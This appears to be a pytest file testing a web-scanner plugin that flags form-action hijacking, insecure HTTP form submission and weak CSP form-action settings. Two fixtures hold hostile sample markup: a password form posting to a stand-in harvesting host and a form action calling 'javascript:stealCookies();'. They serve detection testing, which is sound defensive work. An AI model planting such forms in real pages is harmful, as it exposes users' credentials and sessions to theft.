"""
Tests for FormActionHijackingPlugin.
"""

import asyncio
import pytest

from app.core.enums import Severity
from app.scanner.context import ScanContext
from app.scanner.plugins.passive.form_action_hijacking import FormActionHijackingPlugin


@pytest.fixture
def plugin() -> FormActionHijackingPlugin:
    return FormActionHijackingPlugin()


def test_insecure_http_sensitive_form_high(plugin: FormActionHijackingPlugin):
    """Test sensitive form on HTTPS page submitting to unencrypted HTTP triggers HIGH finding."""
    async def _run():
        context = ScanContext(
            scan_id=1,
            target_url="https://secure.example.com/login",
            user_id=1,
        )
        context.html = (
            "<html><body>"
            "<form action='http://secure.example.com/auth' method='POST'>"
            "<input type='text' name='username'>"
            "<input type='password' name='password'>"
            "<button type='submit'>Login</button>"
            "</form></body></html>"
        )
        context.headers = {"content-type": "text/html"}

        await plugin.run(context)

        assert len(context.findings) == 1
        finding = context.findings[0]
        assert "Insecure Form Submission" in finding.title
        assert finding.severity == Severity.HIGH

    asyncio.run(_run())


def test_external_sensitive_form_high(plugin: FormActionHijackingPlugin):
    """Test sensitive form submitting credentials to an external origin triggers HIGH finding."""
    async def _run():
        context = ScanContext(
            scan_id=1,
            target_url="https://app.example.com/login",
            user_id=1,
        )
        context.html = (
            "<html><body>"
            "<form action='https://attacker-harvest.test/collect' method='POST'>"
            "<input type='password' name='pwd'>"
            "<input type='submit' value='Sign In'>"
            "</form></body></html>"
        )
        context.headers = {"content-type": "text/html"}

        await plugin.run(context)

        assert len(context.findings) == 1
        finding = context.findings[0]
        assert "External Origin" in finding.title
        assert finding.severity == Severity.HIGH

    asyncio.run(_run())


def test_dangerous_javascript_scheme_high(plugin: FormActionHijackingPlugin):
    """Test form action with javascript: URI scheme triggers HIGH finding."""
    async def _run():
        context = ScanContext(
            scan_id=1,
            target_url="https://example.com/contact",
            user_id=1,
        )
        context.html = (
            "<html><body>"
            "<form action='javascript:stealCookies();' method='GET'>"
            "<input type='text' name='msg'>"
            "</form></body></html>"
        )
        context.headers = {"content-type": "text/html"}

        await plugin.run(context)

        assert len(context.findings) == 1
        finding = context.findings[0]
        assert "Dangerous Form Action URI Scheme" in finding.title
        assert finding.severity == Severity.HIGH

    asyncio.run(_run())


def test_csp_form_action_wildcard_medium(plugin: FormActionHijackingPlugin):
    """Test CSP form-action wildcard (*) triggers MEDIUM finding."""
    async def _run():
        context = ScanContext(
            scan_id=1,
            target_url="https://example.com/search",
            user_id=1,
        )
        context.html = (
            "<html><body>"
            "<form action='/search' method='GET'>"
            "<input type='text' name='q'>"
            "</form></body></html>"
        )
        context.headers = {
            "content-type": "text/html",
            "content-security-policy": "form-action *; default-src 'self'",
        }

        await plugin.run(context)

        assert len(context.findings) == 1
        finding = context.findings[0]
        assert "Permissive CSP form-action" in finding.title
        assert finding.severity == Severity.MEDIUM

    asyncio.run(_run())


def test_missing_csp_form_action_low(plugin: FormActionHijackingPlugin):
    """Test sensitive login form without CSP form-action restriction triggers LOW finding."""
    async def _run():
        context = ScanContext(
            scan_id=1,
            target_url="https://example.com/account/login",
            user_id=1,
        )
        context.html = (
            "<html><body>"
            "<form action='/api/login' method='POST'>"
            "<input type='text' name='user'>"
            "<input type='password' name='password'>"
            "<button type='submit'>Sign In</button>"
            "</form></body></html>"
        )
        context.headers = {"content-type": "text/html"}

        await plugin.run(context)

        assert len(context.findings) == 1
        finding = context.findings[0]
        assert "Missing Content-Security-Policy form-action" in finding.title
        assert finding.severity == Severity.LOW

    asyncio.run(_run())


def test_secure_same_origin_form_clean(plugin: FormActionHijackingPlugin):
    """Test secure same-origin form with restrictive CSP form-action produces zero findings."""
    async def _run():
        context = ScanContext(
            scan_id=1,
            target_url="https://example.com/login",
            user_id=1,
        )
        context.html = (
            "<html><body>"
            "<form action='/login/auth' method='POST'>"
            "<input type='password' name='pwd'>"
            "</form></body></html>"
        )
        context.headers = {
            "content-type": "text/html",
            "content-security-policy": "form-action 'self'; default-src 'self'",
        }

        await plugin.run(context)

        assert len(context.findings) == 0

    asyncio.run(_run())


def test_no_forms_clean(plugin: FormActionHijackingPlugin):
    """Test HTML page with no forms produces zero findings."""
    async def _run():
        context = ScanContext(
            scan_id=1,
            target_url="https://example.com/articles/1",
            user_id=1,
        )
        context.html = "<html><body><h1>Article</h1><p>Content without forms.</p></body></html>"
        context.headers = {"content-type": "text/html"}

        await plugin.run(context)

        assert len(context.findings) == 0

    asyncio.run(_run())


def test_empty_html_graceful(plugin: FormActionHijackingPlugin):
    """Test empty HTML content is handled gracefully."""
    async def _run():
        context = ScanContext(
            scan_id=1,
            target_url="https://example.com/unknown",
            user_id=1,
        )
        context.html = ""
        context.headers = {}

        await plugin.run(context)

        assert len(context.findings) == 0

    asyncio.run(_run())
